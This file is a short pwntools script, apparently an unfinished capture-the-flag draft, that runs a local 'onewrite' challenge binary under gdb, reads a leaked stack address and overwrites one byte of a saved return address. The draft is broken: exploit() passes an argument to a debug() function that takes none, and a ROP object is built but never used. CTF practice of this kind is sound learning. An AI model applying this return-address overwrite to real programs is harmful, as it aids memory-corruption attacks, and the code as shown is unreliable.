#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-02-28 14:11:40
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p64, p8

context.arch = "amd64"

filename = "./onewrite"
target_binary = ELF(filename)
target_process = process(filename)


def exploit():
    exploit_rop = ROP(target_binary)

    debug(target_process)


def leak_process(input_to_send):
    target_process.recvuntil(b">")
    target_process.sendline(input_to_send)
    leak_data = target_process.recvline()
    return int(leak_data, 16)


def write_process(address, data):
    target_process.recvuntil(b"address :")
    target_process.send(address)
    target_process.recvuntil(b"data :")
    target_process.send(data)


def compute_address(address, offset):
    return address + offset


def debug():
    gdbscript = """
    pie breakpoint 0x8aad
    pie breakpoint 0x8ab7
    start
    continue
    """

    gdb.attach(target_process, gdbscript=gdbscript)

    leaked_address = leak_process(b"1")
    log.info(f"leaked address: {hex(leaked_address)}")
    rip_address = compute_address(leaked_address, 0x18)
    write_process(str(rip_address).encode(), p8(0x04))


if __name__ == "__main__":
    exploit()

